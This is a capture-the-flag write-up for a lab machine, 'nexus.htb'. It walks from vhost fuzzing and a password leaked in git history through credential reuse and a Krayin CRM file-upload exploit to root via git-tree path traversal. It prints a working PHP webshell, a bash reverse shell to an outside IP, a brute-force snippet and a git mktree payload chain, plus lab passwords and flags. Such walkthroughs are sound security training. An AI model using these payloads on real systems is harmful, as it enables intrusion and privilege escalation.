<div align="center">

```
 _   _ _______  ____  _____
| \ | | ____\ \/ /  / / ____|
|  \| |  _|  \  /| | | (___
| |\  | |___ /  \| |  \___ \
|_| \_|_____/_/\_\_|  ____) |
                       |_____/
```

`[ SIGNAL ACQUIRED :: nexus.htb :: JACKING IN ]`

</div>

<br>

The billboard says **Nexus Energy Authority** — clean power, 32 million households served, a
smiling grid uptime counter blinking `98.7%` in dark-mode green. Corporate chrome, government
seal, the whole civic-tech aesthetic. Underneath it, like always, somebody's `.env` file is
still bleeding into a public git log. This is that story.

<br>

```
▓▒░ 0x00 // RECON — A FRONT DOOR WITH NOTHING BEHIND IT ░▒▓
```

Full TCP sweep, no shortcuts:

```
$ nmap -p- -T4 --min-rate 3000 10.129.234.54
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

$ nmap -p22,80 -sV -sC 10.129.234.54
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://nexus.htb/
```

Two ports. That's the whole attack surface, or so it looks. `nexus.htb` goes in `/etc/hosts`
and resolves to a single-page marketing site — Tailwind gradients, a careers section, a
testimonial carousel, zero forms, zero JS calls, zero backend. `curl` confirms it's a static
file served straight off disk (`ETag`, `Last-Modified`, `Accept-Ranges` — nginx `sendfile`,
not an app).

Directory brute-forcing turns up nothing. Not even a `robots.txt`. This is a decoy — a
company website built to look like the whole target, hiding the actual one behind a vhost
nobody advertised.

<br>

```
▓▒░ 0x01 // THE CATCH-ALL TRAP ░▒▓
```

First vhost fuzz (20k words) looked promising — dozens of hits. All fake. `nginx`'s
`server_name` fallback quietly 302-redirects *any* unmatched `Host:` header back to
`nexus.htb`, and every "hit" was that redirect, not a real vhost:

```
$ curl -s -i -H "Host: totallybogusvhost12345.nexus.htb" http://10.129.234.54/
HTTP/1.1 302 Moved Temporarily
Location: http://nexus.htb/
Content-Length: 154
```

Baseline established: filter on that exact 154-byte body, not the status code. Re-run against
a much bigger list (114k candidates) with the noise stripped out:

```
$ ffuf -u http://10.129.234.54/ -H "Host: FUZZ.nexus.htb" \
       -w subdomains-top1mil.txt -fs 154 -t 100

git.nexus.htb      [Status: 200, Size: 14472]
billing.nexus.htb  [Status: 302, Size: 390]
```

Two real hosts, hiding in plain sight the entire time. `git.nexus.htb` is a Gitea instance.
`billing.nexus.htb` redirects to `/admin/login` and drops a cookie named `krayin_crm_session`
— **Krayin CRM**, a Laravel-based open-source CRM. That job posting on the front page
("Operations Specialist – Customer Platforms... Salesforce, HubSpot, or similar") wasn't
flavor text. It was a fingerprint.

<br>

```
▓▒░ 0x02 // GIT NEVER FORGETS ░▒▓
```

Gitea allows anonymous browsing. One public repo: `admin/krayin-docker-setup` — a deployment
`.env` and a `docker-compose.yml`, presumably uploaded once and "cleaned up." The current
`.env` has `DB_PASSWORD=` — blank, sanitized, useless.

But there are two commits on that file, and diffs don't lie:

```
$ curl -s http://git.nexus.htb/admin/krayin-docker-setup/commit/9b817fa...diff

diff --git a/.env b/.env
-APP_URL=http://nexus.htb
+APP_URL=http://billing.nexus.htb
-DB_PASSWORD=N27xh!!2ucY04
+DB_PASSWORD=
```

The first commit shipped a real MySQL password. The second one "fixed" it by blanking the
field — but git history is forever, and the API happily serves old diffs to anyone who asks.
Rule one of source-review: a redacted secret in the *latest* commit is not a redacted secret,
it's a treasure map.

<br>

```
▓▒░ 0x03 // CREDENTIAL REUSE — THE OLDEST TRICK STILL WORKS ░▒▓
```

`Facade\Ignition` was live on `billing.nexus.htb` (`APP_DEBUG=true`, `can_execute_commands:true`
on `/_ignition/health-check`) — smelled like the classic CVE-2021-3129 Laravel-debug RCE.
Dead end: the app fingerprints as **Laravel 12.54.1 / PHP 8.3.6**, decades past the vulnerable
dependency graph that gadget chain needs. Noted and dropped — no sense forcing a exploit that
the framework version already rules out.

Back to basics: does the leaked DB password get reused anywhere a human would type it?

```python
emails = ["admin@nexus.htb", "admin@example.com", "j.matthew@nexus.htb", ...]
passwords = ["N27xh!!2ucY04", "admin123", "password", ...]
# brute the login form with httpx, watch for a redirect to /admin/dashboard
```

```
SUCCESS: j.matthew@nexus.htb / N27xh!!2ucY04  -> /admin/dashboard
```

`j.matthew` — the "hiring manager" email plastered across the decoy careers page — was a real
Krayin CRM account, and it was still using the password some other engineer glued into a
`docker-compose.yml` eighteen months ago. We're in.

<br>

```
▓▒░ 0x04 // CVE-2026-38526 — UPLOAD YOUR OWN BACK DOOR ░▒▓
```

Authenticated Krayin CRM v2.2.x ships an unrestricted file upload on the WYSIWYG image
endpoint. No extension allow-list, no content-type sniffing worth mentioning:

```python
files = {"file": ("shell.php", open("shell.php","rb"), "image/jpeg")}
r = client.post(f"{BASE}/admin/tinymce/upload", files=files, headers=xsrf_header)
# {"location":"http://billing.nexus.htb/storage/tinymce/<hash>.php"}
```

```php
<?php if(isset($_GET['cmd'])){ system($_GET['cmd']); } ?>
```

```
$ curl "http://billing.nexus.htb/storage/tinymce/<hash>.php?cmd=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Webshell live. Upgrade to a real TTY:

```
$ curl -G ".../shell.php" --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.15.95/4444 0>&1'"
$ nc -lvnp 4444
www-data@nexus:~/krayin/storage/app/public/tinymce$
```

<br>

```
▓▒░ 0x05 // WWW-DATA → JONES ░▒▓
```

The Docker-leaked password was a decoy for a decoy — the *real*, currently-active `.env` was
sitting right there on disk:

```
$ cat /var/www/krayin/.env
DB_PASSWORD=y27xb3ha!!74GbR
```

Same naming scheme, same shape, rotated once. Local system users, no `nologin` shells:

```
jones:x:1000:1000:,,,:/home/jones:/bin/bash
git:x:111:112:Git Version Control,,,:/home/git:/bin/bash
```

Password reuse, round two:

```
$ sshpass -p 'y27xb3ha!!74GbR' ssh jones@nexus.htb id
uid=1000(jones) gid=1000(jones) groups=1000(jones),100(users)

$ cat /home/jones/user.txt
e09b49a662941f0fa0970a1191d296e3
```

**user.txt: `e09b49a662941f0fa0970a1191d296e3`**

`sudo -l` for jones comes back empty. No SUID weirdness, no cron misconfig in the obvious
places. Time to go looking at what's running as root.

<br>

```
▓▒░ 0x06 // ROOT — WEAPONIZING A GIT SYNC SCRIPT ░▒▓
```

`/etc/gitea/` holds a companion script, world-readable, quietly wired into systemd:

```
$ systemctl cat gitea-template-sync.service
[Service]
Type=oneshot
User=root
ExecStart=/usr/bin/python3 /etc/gitea/template-sync.py

$ systemctl cat gitea-template-sync.timer
OnBootSec=1min
OnUnitActiveSec=1min
```

**Every sixty seconds, as root**, this script asks Gitea's API for any repo flagged as a
*template*, walks its tree with `git ls-tree -r HEAD`, and writes every blob to disk:

```python
for mode, objhash, filepath in entries:
    target = os.path.join(stage_path, filepath)   # <-- filepath is attacker-controlled
    ...
    with open(target, 'wb') as f:
        f.write(cat_result.stdout)                # <-- writes with zero sanitization
```

`filepath` comes straight from `git ls-tree`, and git tree entries can legally be named `..` —
they're just bytes to git, and `git mktree` doesn't stop you from nesting them. Nothing in
this script ever checks for that. That's the whole bug.

Logged into Gitea as `jones` (same reused password, of course), created a repo through the
API with `"template": true`, and hand-built a malicious tree with raw git plumbing — no `git
add`, no working directory, just objects:

```bash
BLOB=$(git hash-object -w root_key.pub)
T7=$(printf '100644 blob %s\tauthorized_keys\n' "$BLOB"      | git mktree)   # .ssh/
T6=$(printf '040000 tree %s\t.ssh\n' "$T7"                   | git mktree)   # root/
T5=$(printf '040000 tree %s\troot\n' "$T6"                   | git mktree)
T4=$(printf '040000 tree %s\t..\n'   "$T5"                   | git mktree)   # 5x ".."
T3=$(printf '040000 tree %s\t..\n'   "$T4"                   | git mktree)   # to walk back
T2=$(printf '040000 tree %s\t..\n'   "$T3"                   | git mktree)   # out of
T1=$(printf '040000 tree %s\t..\n'   "$T2"                   | git mktree)   # template-staging/
T0=$(printf '040000 tree %s\t..\n'   "$T1"                   | git mktree)   # <owner>/<repo>/

$ git ls-tree -r $T0
100644 blob c422aa9... ../../../../../root/.ssh/authorized_keys
```

Committed it, pushed over HTTPS with basic auth, no fsck complaints:

```
$ git push origin main:main --force
 + 2f7ce0e...0970eec main -> main (forced update)
```

Sixty seconds later, the timer fires as root, resolves `../../../../../root/.ssh/authorized_keys`
exactly the way any shell would, and writes our public key straight into root's keyring:

```
$ ssh -i nexus_root_key root@nexus.htb 'id; cat /root/root.txt'
uid=0(root) gid=0(root) groups=0(root)
0176e3d03c2bbf830fa3e3a3cc2de6ef
```

**root.txt: `0176e3d03c2bbf830fa3e3a3cc2de6ef`**

<br>

```
▓▒░ 0x07 // AFTER-ACTION ░▒▓
```

- A polished front-end is not the attack surface — it's camouflage. The real box lived
  behind two vhosts nginx's own catch-all redirect was actively working to hide.
- Redacting a secret in a *new* commit does nothing. Git history is a leak that never expires
  unless someone actually rewrites it.
- Password reuse chained this entire box: docker secret → CRM account → `.env` on disk →
  SSH → Gitea. One string, rotated twice, still killed the whole machine.
- The root cause at the top of the chain (CVE-2026-38526) is a familiar shape — unrestricted
  upload on a rich-text editor endpoint. The root cause at the *bottom* (the template-sync
  script) is the more interesting bug: `git ls-tree` output is attacker-controlled the moment
  an attacker can push to *any* repo the script will touch, and nobody in this codebase ever
  asked "can a tree entry be named `..`?" The answer is yes, and git will never stop you.

🪐 Hack The Planet 🪐
